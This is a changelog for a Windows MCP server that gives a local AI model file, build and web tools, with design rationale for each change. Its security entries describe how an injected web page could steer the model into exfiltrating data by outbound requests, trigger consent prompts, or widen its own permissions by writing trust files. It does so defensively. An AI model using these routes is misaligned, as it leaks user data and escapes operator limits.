# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).

## [Unreleased]

### Changed — `bootstrap.py` closing message

It printed three commands with no context. On a machine that has just unzipped
the archive, the first thing needed is not a command but a setting: with
`BIONIC_PROJECT_ROOTS` unset, `write_file` and `build_project` refuse with
`WRITE_PATH_NOT_ALLOWED`, which reads like a broken install rather than a
configuration step. The message now names that first, then how to start, then
how to check, and points at `docs/HOW_TO_USE.md`.

No change to what it installs.
### Changed — repository layout

**`docs/` now holds everything except `README.md` and `CLAUDE.md`.**
`HOW_TO_USE.md`, `CONTRIBUTING.md` and `CHANGELOG.md` moved there; every
cross-link was updated and verified.

`CLAUDE.md` deliberately stays at the repository root. An AI coding tool
discovers it there, so a copy under `docs/` would simply never be read — which
would undo the reason it was renamed from `AI_INSTRUCTIONS.md` in the first
place. A test now pins the root to exactly `README.md` and `CLAUDE.md`, so a
future tidy-up cannot move it and quietly disable the design rules.

`LICENSE` also stays at the root, where package tooling and code-hosting
platforms expect to find it.

### Removed — `requirements.txt`

It was a hand-maintained mirror of `[project.dependencies]`, and its own header
said so. Nothing installed from it: `bootstrap.py` uses `uv sync --extra dev`
or `pip install -e ".[dev]"`, and both read `pyproject.toml`. That left three
copies of the dependency list — the canonical ranges in `pyproject.toml`, the
resolved pins in `uv.lock`, and a third that had to be edited by hand to stay
true.

It cannot be "combined" with `uv.lock`: that file is uv's resolved lockfile,
not a pip-installable input. The two remaining files already cover both jobs,
so the third is gone.

### Fixed

- The packaging guard globbed only the repository root. After the move it would
  have kept passing while guarding nothing — the precise failure it exists to
  prevent. It now covers `docs/` as well, and compares repository-relative
  paths rather than bare filenames.
### Changed — documentation consolidated

Five markdown files had grown to 3,326 lines for a ~2,800-line project, with
`README.md` carrying a second, worse copy of most of `CONTRIBUTING.md`.

**`AI_INSTRUCTIONS.md` is now `CLAUDE.md`.** The file exists to instruct AI
agents working on this code, and Claude Code auto-loads `CLAUDE.md` — not
`AI_INSTRUCTIONS.md`. So 521 lines of design rules were being read only by
whoever thought to open the file. The rename makes it load automatically, which
is what the content was always for. Content unchanged.

**Removed from `README.md`, because `CONTRIBUTING.md` already had it:**

- *Adding a New Tool* — the README copy was strictly worse: it omitted
  `EXPECTED_TOOLS` in `tests/test_integration.py`, which is the check that
  actually catches a tool being documented but never registered.
- *Testing* — the same three pytest commands.
- *Code Style* — four bullets summarising CONTRIBUTING's full section.
- The hand-written project file tree, which was **already stale**: it had been
  missing `consent.py` and `hostgrants.py` since the day they were added. A file
  listing maintained by hand rots by construction, and `ls src/windows_agent_mcp/`
  is authoritative and free. Replaced with a sentence about the layout.

*Security Considerations* is gone as a separate section. Three of its six points
restated *Security Model* a thousand lines earlier; the three that did not are
now the closing part of *Security Model* itself, under "What the boundaries do
not cover" — including the one that matters most, that write access plus command
execution makes the project roots you grant the blast radius.

### Fixed — stale documentation claims

- `README.md` said `web_search` is *"registered **only** when
  `BIONIC_WEB_RESEARCH=1`"*, which the `search` group made untrue, and that
  `fetch_web_page` reads *"documentation hosts only"*, which host grants made
  untrue.
- Both `README.md` and `CONTRIBUTING.md` described recording known bugs as
  `xfail(strict=True)` tests. The suite contains **zero** of them. The README's
  version was a factual claim about the suite and is gone; CONTRIBUTING's is
  prescriptive guidance and stays.
- *Security Considerations* referred to "the Bionic shell" being available for
  arbitrary operations — tooling outside this repository, and meaningless to
  anyone reading a copied project. Rewritten without the external reference.
- `package.py`'s exclusion comment listed `mcp-profiles.json` but not
  `mcp-allowed-hosts.json`, so "why is my file missing from the zip" was not
  fully answerable from that file alone, as its own comment promises.

`CHANGELOG.md` was deliberately left alone. It is append-only history, none of
it is loaded into any model's context, and the detailed rationale has already
been useful for recovering why past decisions were made.

### Added — a `search` tool group

`BIONIC_WEB_RESEARCH` gated two unrelated permissions with one switch: "may run
`web_search`" and "may `fetch_web_page` read any public host". So the posture
that actually suits a small local model -- let it *find* URLs, but still ask
before reading an unvetted host -- could not be expressed. The choices were a
model with a page reader and no way to search, which answers from memory and
invents plausible-looking URLs, or research mode, which opens every public host
at once.

`search` registers `web_search` alone. `research` is unchanged and remains a
strict superset, so no existing configuration behaves differently.

```bash
run_server.bat --tools core,docs,search
```

The intended loop: the model finds a real URL, `fetch_web_page` refuses the
host, the model reports the host to the user, the user grants that one host, the
model reads the page.

Search is a far weaker channel than any-host fetching, which is what makes the
split worth having rather than merely tidy. The exfiltration risk in `research`
is the arbitrary outbound GET -- the attacker reads their own server's logs. A
search query reaches one endpoint the attacker does not control, so it carries
data nowhere they can see it. What search does do is put attacker-chosen titles
and snippets in the model's context, which is why results were already wrapped
in untrusted-content markers.

`search` is excluded from the default group set for the same reason as
`research`: adding it would silently change the posture of every existing
install on upgrade. `get_server_info` now reports `web_search` separately from
`web_research`, and `search_backend` is reported whenever search is available
rather than only under research mode.

Also added: `posture_warnings()` reports group combinations that are legal but
will not do what the operator expects. `search` without `docs` produces URLs
nothing can open, so it is warned about at startup. `docs` without `search` is
deliberately NOT warned about -- it is the default configuration and a
legitimate choice, and a warning on the default teaches operators to ignore
warnings.

### Added — granting one web host, without a restart

`fetch_web_page` read a fixed list of documentation hosts, and everything else
required `BIONIC_WEB_RESEARCH=1` plus a restart. So a model that hit a
legitimate but unlisted site was told to "ask the user", and the only answer the
user could give was to open *every* public host. The middle ground — "yes, that
one site" — did not exist.

It does now, by two routes that work independently.

**A grants file, re-read on every fetch.** `mcp-allowed-hosts.json` (gitignored,
managed by `python -m windows_agent_mcp.hostgrants --add HOST`) names hosts that
join `ALLOWED_DOC_HOSTS`. Because the file is re-read whenever its stat
signature changes, a grant applies to the model's *next call* — no restart. Also
settable as `BIONIC_EXTRA_DOC_HOSTS` for clients that expose only an `env`
block, and per-run via `run_server.bat --allow-host`. Entries are exact
hostnames: wildcards are refused, because `*.example.com` reads like a narrow
grant and is really an any-host grant for that zone.

**A prompt, where the client supports it.** `fetch_web_page` is now an async
shell around the synchronous `read_web_page`, and on a host-only refusal it uses
MCP elicitation to ask the operator directly, then retries in the same call.
Every way that can fail — no capability, declined, cancelled, timed out,
transport error — degrades to the structured refusal, so nothing depends on
client support. `BIONIC_HOST_CONSENT=0` turns prompting off entirely; a prompt
the model can trigger is a prompt an injected page can trigger.

An approval lasts only until the server restarts unless
`BIONIC_HOST_GRANT_PERSIST=1`. That default is a security decision rather than
caution: the MCP specification permits a client to answer an elicitation itself,
so an approval is not evidence a human saw it.

The refusal message was rewritten around what a small model actually does with
it. It now says the *whole host* is refused rather than that page (a model told
only "not allowed" guesses another path, then another), names the documentation
hosts that already work so a spec lookup can answer the question without
bothering anyone, gives the exact command for the user to run, and warns that a
URL the model did not get from `web_search` or from the user may not exist at
all. That last line came from the reported failure: the invented URL returned
404 when tested, so the grant it asked for would not have helped.

### Fixed — found by driving the real server, not by the unit tests

- **A redirect the allowlist refused was reported as a network failure.** A
  granted host that redirects off itself -- overwhelmingly `www.example.com`
  going to the apex `example.com`, which is a different hostname and separately
  ungranted -- produced `PAGE_FETCH_FAILED` with recovery text advising the
  operator to *check their network connection*, about a request their own
  allowlist had blocked. Refused hops now raise a typed
  `RedirectNotAllowedError` and surface as `URL_NOT_ALLOWED`, naming the
  **redirect target** rather than the requested URL (the requested host is
  usually already granted, so naming it would send the operator to grant a host
  they had granted), and explaining the www/apex split. `ALLOWED_DOC_HOSTS`
  already lists both spellings for `khronos.org` for this reason; broadening a
  grant to cover both automatically would be the silent widening this module
  refuses for wildcards.
- **The grants-file cache could serve stale trust data.** Parsed results were
  keyed on `(path, st_mtime_ns, st_size)`, which looks sound and is not: mtime
  resolution on NTFS here is roughly a millisecond, so two writes of equal
  length inside one clock tick share a signature and the old host set wins --
  a revoked host still reading as granted, or a fresh grant still reading as
  refused. The cache is gone rather than repaired: a correct key would have to
  read the file anyway, and this runs once per fetch against an operation that
  already does a DNS lookup and a TLS handshake. The test that exposed it (12
  rewrites in a tight loop) is kept as a regression guard.

### Security

- **`write_file` and `edit_file` now refuse the server's own trust files.** Any
  path named `mcp-allowed-hosts.json` or `mcp-profiles.json` is rejected with
  `PROTECTED_PATH`, anywhere on disk. Those files decide which hosts are
  readable and which directories are writable, so a model able to write one
  could widen its own permissions. The check is by filename rather than by
  resolved path because both files are searched for in the current directory
  first: the dangerous move is *creating* one where none existed, and a path
  check cannot see a file that does not exist yet.
- Granted hosts join `ALLOWED_DOC_HOSTS` and never `ALLOWED_NETWORK_HOSTS`, so
  a grant is read-into-context only and cannot give any host the right to write
  bytes to disk.
- `DocRedirectHandler` consults the grant set per redirect hop rather than
  capturing it at import, so a granted host does not become readable at its
  canonical URL and refused the moment it redirects.
- Consent is offered only when the host allowlist is the *only* thing wrong with
  a URL, and the check does not resolve DNS — so a refused host is still never
  looked up, and the operator is never asked to approve what is really an SSRF
  probe.

### Fixed

- **`run_server.bat` still printed an `S:\path\to\your\project` example**, a
  drive letter that exists only on the authoring machine. Now `C:`, matching the
  rule already applied to the other shipped documentation.

### Added — `HOW_TO_USE.md`

Usage instructions existed but were scattered: install steps in the README's
Quick Start, the copy-to-another-machine flow in its own section, and the parts
needed in between — pointing the server at a project, choosing which tools load,
wiring it into an MCP client — spread across the *Tool groups*, *Profiles* and
*Configuration* reference sections. Anyone unzipping this on a new machine had
to assemble the sequence themselves from a reference document.

`HOW_TO_USE.md` is now the task-oriented guide: numbered steps, each
ending in a command that can be run and a result that can be seen — what it is,
copy it, install, point it at your project, choose which tools load, run it,
connect your client, troubleshoot. The README's Quick Start is a short pointer
to it, keeping the two most common commands inline; the README remains the
reference for per-tool documentation, the security model and the full
configuration surface.

`get_server_info` is named as the single diagnostic throughout, so a reader
learns one habit rather than six, and the troubleshooting table covers the real
failure modes rather than invented ones: an unset `BIONIC_PROJECT_ROOTS`
producing `WRITE_PATH_NOT_ALLOWED` (which reads like a bug), a stale shell PATH
hiding `npx`, a missing tool that is only an inactive group, and a profile
silently overridden by an explicit `BIONIC_TOOLS`.

### Fixed

- **`HOW_TO_USE.md` would not have shipped in the archive.** `package.py`
  selects by allowlist, so a new document is excluded by default — which is
  correct for files holding local paths and absurd for the one file whose
  purpose is explaining a copied project. Added to `INCLUDED_FILES`, and a
  guard test now asserts every top-level `*.md` in the repository is either
  packaged or listed in an explicit `NOT_PACKAGED` set. The existing allowlist
  tests run against a fabricated tree and so could not catch a real file being
  forgotten; this one reads the actual repository. Confirmed the guard fails
  before the fix.
- **Machine-specific absolute paths in the shipped documentation.** `README.md`
  and `.env.example` contained `S:/mcp-server/.venv/Scripts/...` and
  `S:/work/game`, which describe one particular machine and mislead anyone
  reading on another. Now relative paths or obvious placeholders
  (`C:/path/to/your/project`).
- **`profiles --init` wrote an `S:`-drive placeholder** into the operator's own
  `mcp-profiles.json`. A drive letter that exists only on the authoring machine
  reads like a real path rather than something to replace; it is now `C:`.


### Added — `bootstrap.py` and `package.py`

Getting the server running on a fresh machine required knowing
`uv sync --extra dev` or the `venv` + `pip install -e ".[dev]"` pair, neither
written anywhere a newcomer looks first — and `run_server.bat` only reported the
symptom ("No virtual environment found") rather than the fix. Copying the
project elsewhere was worse: the folder carries `.venv` (large, with absolute
paths baked into its scripts) and `mcp-profiles.json` (machine-specific project
paths), and `git archive` is unavailable because this is not a git repository.

**`bootstrap.py`** creates `.venv`, installs the project, and verifies the
result by importing the package and counting registered tools — the same check
`run_server.bat` performs, because an install that reports success while leaving
the package unimportable is the failure worth catching. Prefers `uv sync`
(faster, and honours `uv.lock`), falls back to `python -m venv` plus `pip`.
Flags: `--no-dev`, `--check`, `--force`.

- **Stdlib only**, and that is a hard constraint: the script runs *before*
  anything is installed, so a single third-party import would make it unable to
  do its job. A test parses the file's AST and checks every import against
  `sys.stdlib_module_names`.
- The Python floor is read from `requires-python` in `pyproject.toml` rather
  than hardcoded. `tomllib` is used when available and a regex otherwise —
  `requires-python` is `>=3.10` while `tomllib` only arrives in 3.11, so the
  script has to reject an interpreter too old to parse the file that says it is
  too old.
- No `--here` flag: `run_server.bat` requires `.venv`, so installing into the
  current interpreter would produce a setup that looks installed and still
  fails.

**Deliberately NOT named `setup.py`.** That name is reserved — setuptools'
PEP 517 backend picks one up if it exists, so a plain installer script under
that name risks breaking `pip install .`. setuptools is not installed locally
(uv omits it), so the interaction could not be verified without a network
install, and designing around it beat gambling. `pyproject.toml` stays the
single build definition, and `pip install .` was confirmed still working in a
throwaway venv with both new scripts present.

**`package.py`** writes `dist/windows-agent-mcp-<version>.zip` — 83 files,
~350 KB compressed — then reopens and verifies it (`testzip()` plus an entry
count, which catches a truncated write). `--list` is a dry run; `--dest DIR`
copies into a directory instead. Everything sits under one `windows-agent-mcp/`
prefix so extracting does not splatter files.

Selection is an **allowlist**, not an exclusion list. For "copy to another
machine" the bad outcome is shipping an absolute path or a secret, so anything
not named in `INCLUDED_DIRS` / `INCLUDED_FILES` is left out, and a
machine-specific file added later is excluded by default rather than silently
travelling. The cost is that an allowlist fails by *omission* — hence `--list`,
and hence the extract-and-test step documented in the README.

`filescan.SKIPPED_DIRECTORY_NAMES` was considered for the exclusions and
**rejected**: it is search-oriented and also skips `bin`, `obj`, `dist`,
`debug`, `release` and `x64`. Correct for a grep, wrong for a source archive,
where it would one day silently drop a legitimate `src/.../bin/`. A narrow
cache list local to `package.py` says what it means, and the rejection is noted
in a comment so it is not "fixed" later.

### Fixed

- **A test assumed a bootstrapped checkout.**
  `test_verify_counts_tools_with_the_real_venv` asserted that
  `.venv/Scripts/python.exe` works, which fails in a fresh copy where `.venv`
  does not exist yet — exactly what an unzipped archive looks like before
  `bootstrap.py` runs. It now skips with that reason, so the suite passes on a
  fresh checkout. Found by the new verification step: extracting a real archive
  and running the tests from inside it, which is the only check that exercises
  the fresh-copy state.


### Added — named profiles (`mcp-profiles.json`, `BIONIC_PROFILE`)

`BIONIC_TOOLS=edit,build,docs` works but is unpleasant to live with: the useful
combinations have to be remembered, and there is nowhere to record why one
exists. A profile gives a combination a name, a description and an `enable`
flag.

- New `src/windows_agent_mcp/profiles.py`, plus a CLI: `--init` scaffolds the
  file, `--list` shows names / state / tool counts, `--emit client` prints MCP
  client config, `--emit inspector --profile NAME` prints an Inspector config.
- `run_server.bat --profile NAME` and `BIONIC_PROFILE` select one.
  `BIONIC_PROFILES_FILE` points at a file elsewhere.
- `mcp-profiles.json` is **gitignored** and scaffolded per machine. It holds
  project paths, and a committed absolute path is the same class of bug as the
  hardcoded download root fixed earlier in this changelog.
- `get_server_info` gains `profile`, `profile_error` and `profiles_file`.

**`tools` is validated when the file loads**, which is the main reason to
prefer a profile over the bare variable. `"tools": "core,cpp"` is the natural
mistake — `cpp` sounds like a group and is not one — and is reported by name
with the six real groups listed. As an environment variable the same typo only
warns at startup and silently registers the default 17 tools. Validation reuses
`utils.parse_tool_groups()` rather than reimplementing it, so `all`, case,
whitespace, duplicates and the implicit `core` all behave identically.

`enable: false` **parks** a profile rather than deleting it: it is omitted from
emitted client config, and selecting it is refused as *disabled* — distinct
from *not found*, because one is a flag to flip and the other a name to
correct. The scaffold ships `research` disabled, since it is the profile that
widens the network posture.

**Layering, worth knowing before changing it.** `profiles.py` needs
`VALID_TOOL_GROUPS` from `utils`, so `utils` cannot import it — which rules out
teaching `active_tool_groups()` about profiles. Instead `main()` resolves the
profile first and populates `BIONIC_TOOLS` from it, after which every existing
path works unchanged and `utils` gains no coupling at all.

Precedence is "more local wins": an explicit `BIONIC_TOOLS` beats a profile's
`tools`, and an already-set variable beats a profile's `env` entry, so a
profile in a client config can be overridden for one run without editing it.
The override is logged rather than silent — a quietly ignored profile is
exactly the confusion this feature removes.

A missing file, malformed JSON, an unknown name and a disabled name all leave
the server running with the default tool set, reporting the reason on stderr
and in `get_server_info`. The CLI is the opposite: interactive, so it exits
non-zero.

Emitted client config uses an **absolute** command path. A bare
`"windows-agent-mcp"` looks right but fails in a real client, because the
console script lives in `.venv/Scripts` and is not on a global PATH.

`BIONIC_PROFILE` and `BIONIC_PROFILES_FILE` were added to
`inspector_config.FORWARDED_ENV_VARS` in the same change. Without that,
`--dev --profile cpp` would silently do nothing — the identical invisible
failure `BIONIC_TOOLS` had before the Inspector env fix — so it is verified
through the Inspector's own spawn path rather than only directly.

Verified end to end: `cpp` 14 tools, `explore` 7, `review` 12, disabled and
unknown names 17 with the reason reported, `BIONIC_TOOLS=core` overriding
`--profile cpp` down to 7 with a warning, and `--dev --profile cpp` giving 14
tools through the Inspector.


### Fixed — `--dev` silently discarded every environment variable

Under `run_server.bat --dev`, **no `BIONIC_*` variable reached the server**.
`--tools core,docs` registered all 17 tools; `--web` produced a server with
research mode off and `web_search` absent; a `BIONIC_PROJECT_ROOTS` set for a
`--dev` session left writes confined to the download sandbox. Nothing errored —
the server simply ran with defaults, which is why it went unnoticed: every
observed tool count was a plausible default.

Cause is in the MCP SDK, and it is deliberate. `StdioClientTransport` spawns a
server with `getDefaultEnvironment()`, a fixed allowlist, rather than the
parent environment — on Windows: `APPDATA`, `HOMEDRIVE`, `HOMEPATH`,
`LOCALAPPDATA`, `PATH`, `PROCESSOR_ARCHITECTURE`, `SYSTEMDRIVE`, `SYSTEMROOT`,
`TEMP`, `USERNAME`, `USERPROFILE`, `PROGRAMFILES`. The point is that a client
must not leak its own secrets into every server it launches. So the launcher
exporting a variable and the Inspector spawning the server were never
connected.

Inspector 2.x has no `-e KEY=VALUE` flag; the supported route is a config file
with an explicit `env` block, selected by `--config <path> --server <name>`.
Values stated there *are* passed, because they were declared rather than
inherited.

- New `src/windows_agent_mcp/inspector_config.py` generates that config.
  Written in Python rather than assembled in batch because quoting a Windows
  path inside JSON inside a cmd `set` is a reliable way to produce a broken
  file; it also makes the variable mapping testable.
- `run_server.bat --dev` now writes the config to `%TEMP%` and launches
  `npx @modelcontextprotocol/inspector --config ... --server windows-agent-mcp`.
  A failed write aborts with a clear message instead of starting a server that
  ignores your settings.
- Only variables that are actually set are forwarded, and only the seven this
  server reads. An unset variable is omitted rather than written as `""` — a
  variable nobody set invites a future truthiness change to enable a feature by
  accident — and unrelated variables are never copied, so the SDK's
  anti-leakage intent is preserved rather than undone.
- A test pins the forwarded list against `utils`' actual env-var constants, so
  adding a new setting without forwarding it fails loudly.

Verified end to end through the Inspector's own spawn path: nothing set → 17
tools; `BIONIC_TOOLS=core,docs` → 8 with no `write_file`;
`BIONIC_TOOLS=edit,build,docs` → 14; `BIONIC_WEB_RESEARCH=1` → 18 with
`web_search` present.


### Added — tool groups (`BIONIC_TOOLS`)

Tools are now organised into six groups so a session registers only what it
needs: `core` `edit` `build` `docs` `net` `research`.

- **Why:** tool definitions are re-serialized into the model's prompt every
  turn, so they are a permanent tax on the context window. Even after the
  description trim, 18 tools cost ~4,000 tokens — 40% of an 8K window before
  the model reads a line of code. A session writing C++ has no use for
  `download_file`; a review session needs no write access at all.
- `core` is always registered whether listed or not, and `get_server_info`
  lives in it deliberately: it reports which groups are active, so "why can I
  not see `compile_shader`" stays answerable in every configuration. A test
  pins that, and a second test keeps `core` read-only — no tool in it may
  write, execute or reach the network.
- **Boundaries follow trust, not topic.** `edit` and `build` are separate so
  "build and review this, but do not touch my files" (`BIONIC_TOOLS=build,docs`,
  12 tools) is expressible. `docs` and `net` are separate because `docs` only
  reads into context while `net` writes bytes to disk — the same distinction as
  `ALLOWED_DOC_HOSTS` versus `ALLOWED_NETWORK_HOSTS`.
- **Unset behaves exactly as before**: every group except `research`, the same
  17 tools that existed before this change. Upgrading alters nothing.
- Profiles: `core` 7 tools / ~968 tokens · `core,docs` 8 / ~1,315 ·
  `build,docs` 12 / ~2,318 · `edit,build,docs` 14 / ~2,836 · unset 17 / ~3,195
  · `all` 18 / ~3,375.
- `run_server.bat` gains `--tools GROUPS` and reports the active set at
  startup, including a note when `edit` is absent so a refused write is
  explained before it happens.
- `get_server_info` gains `active_tool_groups`, `available_tool_groups`,
  `registered_tool_count`, `tool_groups_env_var` and `tool_groups_error`.

**Considered and rejected: splitting into several MCP servers.** The proposal
was one server per purpose (general / cpp / research), toggled in the client.
Measured against the real C++ workflow it buys only 16–26%, because the tools
that any one purpose needs are the expensive ones — while costing three
codebases that must not drift on shared security policy (`resolve_write_path`,
the PowerShell allowlist, SSRF validation and the diagnostics parser all
straddle the proposed boundaries). It also would **not** break the exfiltration
chain: the model holds both tool lists in one context and can relay data
between them itself, so a process boundary constrains nothing there. Groups
give the same on/off control with one policy and one test suite, and the
client-side toggle UX is still available by pointing several client entries at
the same binary with different `BIONIC_TOOLS` values (documented in README).

**Accepted tradeoff, stated rather than buried:** `research` is an ordinary
group, so listing it in `BIONIC_TOOLS` widens the network posture on its own —
a context-economy setting that also changes a security setting. This was an
explicit choice for one variable instead of two. `BIONIC_WEB_RESEARCH=1` is
kept as an alias that adds the `research` group, so every pre-groups config and
the `--web` flag keep working, and there is no half-state where the posture
widens but `web_search` is absent.

**Failure handling:** an unrecognised group name does not abort startup.
Aborting surfaces in an MCP client as an opaque connection failure; instead the
server logs to stderr, registers the default set, and reports the message in
`get_server_info`. A typo silently yielding a different tool set is the outcome
being avoided, and reporting prevents that without a dead server.

Also fixed while implementing the launcher flag: `cmd.exe` treats `,` as an
argument delimiter, so `--tools core,docs` arrived as three tokens and only
`core` was captured while `docs` fell through to the unknown-option branch. The
parser now collects every following non-option token and rejoins them, which
handles the quoted form too. A second bug in the same block piped to `find` to
test for a substring — on a machine with Git for Windows on PATH that resolves
to the Unix `find` and the check silently breaks; it now uses batch string
substitution and spawns no process.


### Added — C++ / graphics workflow (7 tools)

Aimed at a small local model working on a C++ game project against Vulkan or
D3D12. Before this the model could read code and start a build, but could not
write a line of source, search a tree, compile a shader, or find out what GPU
it was targeting.

- **`write_file` and `edit_file`.** The gap that mattered most: there was no
  way to modify a file at all. `Set-Content`, `Add-Content` and `Out-File` are
  not on the PowerShell allowlist and `>` is rejected by the composition
  scanner, so `New-Item -Value` was the only way to produce content — create
  once, never edit.
  - Writes are confined to the download root plus `BIONIC_PROJECT_ROOTS`, so a
    default install still cannot modify source anywhere. Reusing that variable
    rather than adding a second one is deliberate: execution and write access
    to a tree are the same trust decision.
  - `..` and symlinked parents are resolved *before* the containment test.
  - Writes are atomic (temp file plus rename), so an interrupted write cannot
    leave a truncated source file.
  - `edit_file` detects the file's line-ending convention, matches in LF space
    so a caller's `\n` string finds a CRLF file, and restores CRLF afterwards.
    Without that, editing a CRLF file with LF strings silently never matches.
  - A non-unique `old_string` is refused with its count, not first-match
    replaced. `write_file` refuses to clobber unless asked, and says to use
    `edit_file`.
- **`search_files` and `find_files`.** Recursive content and name search. There
  was previously no recursive search of any kind: `list_directory` is one
  level, and although `Select-String` is allowlisted, pipelines are blocked, so
  `Get-ChildItem -Recurse | Select-String` could not run. Build and
  version-control directories (`build`, `out`, `x64`, `Debug`, `Intermediate`,
  `.git`, `node_modules`, …) and binary files are skipped — on a game tree the
  build output dwarfs the source. Skipped, unreadable and truncated counts are
  reported rather than swallowed.
- **`build_project`.** Runs a build and returns parsed diagnostics instead of
  64 KB of raw log. Understands MSVC (`C####`, `LNK####`), clang, gcc, CMake
  configure errors, ninja and the shader compilers. Identical diagnostics
  collapse with a repeat count, which matters because MSVC repeats a bad
  header's error once per translation unit. Reuses
  `validate_powershell_command()` wholesale, then narrows to build drivers and
  executes argv with no shell. **If the build fails and nothing parses, the
  tail of the raw output is shown** — a clean report on a failed build would be
  a lie the model acts on.
- **`compile_shader`.** glslc, glslangValidator, dxc and fxc, selected from the
  file extension, with diagnostics parsed the same way. Previously the model
  could write GLSL or HLSL but had no way to find out whether it compiled —
  none of the shader compilers were on the allowlist.
- **`get_gpu_info`.** Adapters and drivers via WMI, the driver's Vulkan view
  via `vulkaninfo --summary`, the graphics toolchain found on PATH, and SDK
  environment variables. `get_system_info` reports OS and CPU only, so the
  model was guessing about extension support — and a wrong guess about
  ray-tracing or mesh shaders compiles fine and fails at device creation. Each
  probe is separately time-limited, and a section that could not be probed says
  so rather than being omitted. Direct3D feature levels are deliberately **not**
  reported: obtaining them needs a D3D12 device, so a value here would be a
  guess.

### Changed — `fetch_web_page` reads documentation without research mode

- Moved out of `WEB_TOOLS` and registered unconditionally. By default it may
  read a fixed list of documentation hosts (`utils.ALLOWED_DOC_HOSTS`:
  registry.khronos.org, docs.vulkan.org, learn.microsoft.com,
  en.cppreference.com, cmake.org, gpuopen.com and a few more) plus the network
  allowlist; research mode still widens it to any public host.
- Rationale: a model writing Vulkan or D3D12 guesses enum and structure names
  constantly, and the fix is one spec lookup. Requiring the operator to open
  the whole network posture for that was the wrong trade. This does not reopen
  the exfiltration channel research mode does — exfiltration needs an
  *arbitrary* outbound GET so the attacker can read their own logs, and
  smuggling data into a path on a host they do not control tells them nothing.
  Hence a fixed, wildcard-free list.
- `ALLOWED_DOC_HOSTS` is a **separate** frozenset from
  `ALLOWED_NETWORK_HOSTS`, because the latter also governs `download_file` and
  `fetch_https_response`; adding a host there would grant the right to write
  its bytes to disk. A test asserts the two sets are disjoint, and that doc
  hosts are still refused by both download tools.
- Added `DocRedirectHandler`. Reusing `SafeRedirectHandler` would validate
  redirect hops against the six-host list and refuse learn.microsoft.com's
  locale redirect, which fires on essentially every request.
- Research mode now adds exactly one tool (`web_search`) rather than two.
  `WEB_RESEARCH_DISABLED` is no longer reachable from `fetch_web_page`; an
  off-list host returns `URL_NOT_ALLOWED` whose recovery text names the
  documentation hosts and says that reading arbitrary sites is the operator's
  decision.

### Added — allowlist entries

- Shader and SPIR-V tools: `glslc`, `glslangValidator`, `dxc`, `fxc`,
  `spirv-val`, `spirv-dis`, `spirv-opt`, `spirv-cross`, plus `ctest`.
- `BUILD_COMMANDS`, a strict subset of `ALLOWED_COMMANDS` that `build_project`
  will drive. Narrower on purpose: it executes argv with no shell, so a cmdlet
  cannot run, and "that is not a build command" is a far better error than a
  confusing exec failure.

### Changed — tool descriptions are trimmed on the wire

- `main.tool_description()` strips the `Args:` / `Returns:` / `Raises:` /
  `Example:` blocks from each docstring before registration, because the JSON
  input schema already states every parameter's name, type and default more
  precisely than prose can. Sending both spends context to say the same thing
  twice.
- Measured effect on `tools/list`: **26,084 → 16,166 chars, ~6,500 → ~4,040
  tokens, a 38% reduction.** On an 8K-context local model that is roughly a
  quarter of the entire window handed back before any work begins.
- Every line that steers tool *choice* is kept deliberately — "Preferred over
  write_file for changing existing code", the uniqueness rule, the
  compiler-selection table. Those exist because a 7B–9B model picks the wrong
  tool without them, so cutting them would trade context away for exactly the
  errors the context was preventing. Tests pin each one.
- Implemented with `add_tool(fn, description=...)` rather than by mutating
  `fn.__doc__`. Mutation would leak across the process: any later reader —
  the test suite included — would see a truncated docstring depending on
  whether `main()` had run first. A test asserts the function objects are left
  untouched.

### Changed — internals

- New `process.py`: `get_windows_development_environment()` moved here from
  `tools/run_powershell.py` (still importable from its old location), plus
  `run_process()`, a bounded argv-based runner shared by `build_project`,
  `compile_shader` and `get_gpu_info`. A timeout is reported, not raised, and
  output produced before it is preserved — that tail names the file the
  compiler was stuck on.
- New `diagnostics.py` (pure functions) and `filescan.py` (walking, pruning,
  globbing), both kept out of the tool modules so the rules most likely to be
  wrong on a given project layout are testable on their own.
- `get_server_info` now reports `writable_roots`, `project_roots_configured`
  and `documentation_hosts`. An unset `BIONIC_PROJECT_ROOTS` is the single most
  common cause of a refused write or build, and reporting it turns "permission
  denied" into something the model can explain to the user.
- `SafeRedirectHandler` gained an `extra_allowed_hosts` class attribute. Like
  `allow_any_host` it must stay a class attribute: `build_opener` instantiates
  the class with zero arguments.
- Tests: 748 → 998. Coverage 97% → 98%, with every new module at 100%.

### Fixed

- **CMake message blocks were truncated at the first blank line.** A
  `find_package` failure separates its prose from the list of candidate config
  filenames with an empty line, so the parser dropped the actionable half of
  the message. Found by a test written against real CMake output, and
  confirmed against a live `cmake` configure failure.
- **WMI driver dates rendered as `(/Date(1719`.** `ConvertTo-Json` does not
  emit ISO 8601 for a `DateTime`; it emits `/Date(1719705600000)/`, so slicing
  the first ten characters produced nonsense. Found by running the tool on a
  real machine rather than only against fixtures.
- **`vulkaninfo --summary` reported everything except the GPUs.** Its instance
  extension and layer lists come first and, on a three-adapter machine with 20
  extensions and 17 layers, consumed the whole line budget before reaching the
  device list. Those lists are now dropped (their counts kept, the omission
  disclosed) so `deviceName`, `apiVersion` and `driverVersion` always survive.
  A second bug in the same filter used `set(line) > {"=", "-"}` -- a
  strict-superset test, which kept only lines containing BOTH characters and so
  discarded every `deviceName = ...` line.
- **`compile_shader` reported "BUILD FAILED" for one bad shader**, which reads
  as though the whole project failed. `format_report` now takes a `subject`,
  and a shader failure says `COMPILE FAILED`.
- **Long diagnostics are capped at display time.** A real MSVC template error
  prints the fully expanded type and runs to thousands of characters; twenty of
  those is the entire context window. The cap is applied when rendering, not
  when parsing, so two errors differing only past the cap still deduplicate
  separately.


### Fixed — the server could not be installed

- **Declared the `mcp` dependency.** `[project]` had no `dependencies` key at
  all, the `mcp` extra had the requirement commented out, and `uv.lock` had no
  `mcp` entry — so `uv sync` and `pip install -e .` both installed nothing.
  Now `mcp>=2.0`; the `MCPServer` API this server is built on does not exist in
  the 1.x line, where it was called `FastMCP`, so 2.0 is a hard floor.
- **Made the package installable.** `error.py` and `log.py` lived only at the
  repository root while every tool imported them as top-level modules; that
  resolved by accident when run as `python main.py` from the root and failed
  outright under any install. Everything now lives in a single
  `src/windows_agent_mcp/` package using relative imports.
- **Fixed the console script.** `windows-agent-mcp = "main:main"` pointed at a
  module that was never packaged (`packages.find` picked up only `tools`). It
  is now `windows_agent_mcp.main:main`, and `python -m windows_agent_mcp` works
  too.
- **Removed the machine-specific download root.** The default was a hardcoded
  path under one developer's user profile; `mkdir` on it raised
